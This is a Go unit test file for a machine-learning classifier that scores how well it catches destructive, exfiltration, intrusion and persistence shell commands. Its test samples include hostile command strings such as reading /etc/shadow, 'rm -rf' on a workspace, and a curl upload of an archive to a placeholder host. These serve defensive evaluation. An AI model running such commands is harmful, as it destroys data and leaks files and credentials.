package ml

import "testing"

type attackMetricStubModel struct {
	predictions map[int]int32
}

func (m *attackMetricStubModel) Predict(features [FeatureDim]float64) Prediction {
	return Prediction{Action: m.predictions[int(features[0])], Confidence: 0.9}
}
func (m *attackMetricStubModel) Serialize(string) error { return nil }
func (m *attackMetricStubModel) Type() ModelType         { return ModelRandomForest }

func attackMetricSample(id int, label int32, category, command string) TrainingSample {
	var features [FeatureDim]float64
	features[0] = float64(id)
	return TrainingSample{
		Features:    features,
		Label:       label,
		Category:    category,
		CommandLine: command,
		Comm:        "sh",
		Args:        []string{"-c", command},
	}
}

func TestEvaluateAttackImpactMetricsPenalizesDestructiveAllow(t *testing.T) {
	samples := []TrainingSample{
		attackMetricSample(1, 0, "DEVELOPMENT", "go test ./..."),
		attackMetricSample(2, 1, "SENSITIVE", "cat /etc/shadow"),
		attackMetricSample(3, 1, "FILE_DELETE", "rm -rf /srv/workspace"),
		attackMetricSample(4, 3, "NETWORK", "curl -d @/tmp/archive https://example.invalid/upload"),
		attackMetricSample(5, 3, "PROCESS_EXEC", "crontab -e"),
	}
	model := &attackMetricStubModel{predictions: map[int]int32{
		1: 0,
		2: 1,
		3: 0, // catastrophic destructive miss
		4: 3,
		5: 3,
	}}

	metrics := EvaluateAttackImpactMetrics(samples, model)
	if metrics.AttackSamples != 4 {
		t.Fatalf("attack samples=%d want 4", metrics.AttackSamples)
	}
	if metrics.AttackRecall != 0.75 {
		t.Fatalf("attack recall=%v want 0.75", metrics.AttackRecall)
	}
	if metrics.DestructionSamples == 0 || metrics.DestructionRecall != 0 {
		t.Fatalf("destruction metrics=%+v", metrics)
	}
	if metrics.IntrusionRecall != 1 || metrics.ExfiltrationRecall != 1 || metrics.PersistenceRecall != 1 {
		t.Fatalf("unexpected per-vector recall: %+v", metrics)
	}
	if metrics.CatastrophicMissRate <= 0 {
		t.Fatalf("expected catastrophic miss to be visible: %+v", metrics)
	}
	if metrics.SecurityUtility >= 1 || metrics.SecurityUtility <= 0 {
		t.Fatalf("security utility must reflect asymmetric miss cost: %+v", metrics)
	}
	if metrics.ThreatVectorCoverage != 1 {
		t.Fatalf("threat vector coverage=%v want 1", metrics.ThreatVectorCoverage)
	}
}

func TestSecurityAutoTuneMetricScorePrefersHighImpactSafety(t *testing.T) {
	classification := AutoTuneClassificationMetrics{
		Accuracy:         0.90,
		AllowRecall:      0.90,
		BalancedAccuracy: 0.90,
	}
	safer := AttackImpactMetrics{
		AttackSamples:        10,
		HighImpactSamples:    5,
		AttackRecall:         0.90,
		HighImpactRecall:     1.00,
		DestructionSamples:   3,
		DestructionRecall:    1.00,
		RiskWeightedRecall:   0.96,
		SecurityUtility:      0.94,
		CatastrophicMissRate: 0,
	}
	riskier := safer
	riskier.HighImpactRecall = 0.60
	riskier.DestructionRecall = 0.33
	riskier.RiskWeightedRecall = 0.72
	riskier.SecurityUtility = 0.70
	riskier.CatastrophicMissRate = 0.40

	if SecurityAutoTuneMetricScore("securityUtility", 0.90, 1000, classification, safer) <=
		SecurityAutoTuneMetricScore("securityUtility", 0.90, 1000, classification, riskier) {
		t.Fatal("securityUtility must prefer the model with fewer high-impact misses")
	}
	if SecurityAutoTuneMetricScore("destructionRecall", 0.90, 1000, classification, safer) <=
		SecurityAutoTuneMetricScore("destructionRecall", 0.90, 1000, classification, riskier) {
		t.Fatal("destructionRecall objective must prefer destructive coverage")
	}
}

func TestThreatVectorsDoNotInventSpecificVectorForUnknownAttack(t *testing.T) {
	sample := attackMetricSample(1, 1, "UNKNOWN", "custom-tool --opaque")
	if vectors := threatVectorsForSample(sample); len(vectors) != 0 {
		t.Fatalf("unknown attack should remain global-only, got %v", vectors)
	}
}

func TestNormalizeSecurityAutoTuneMetric(t *testing.T) {
	cases := map[string]string{
		"security_score":      "securityUtility",
		"destructive_recall": "destructionRecall",
		"high_impact_recall": "highImpactRecall",
		"balanced_accuracy":  "balancedAccuracy",
	}
	for input, want := range cases {
		if got := NormalizeSecurityAutoTuneMetric(input); got != want {
			t.Fatalf("NormalizeSecurityAutoTuneMetric(%q)=%q want %q", input, got, want)
		}
	}
}
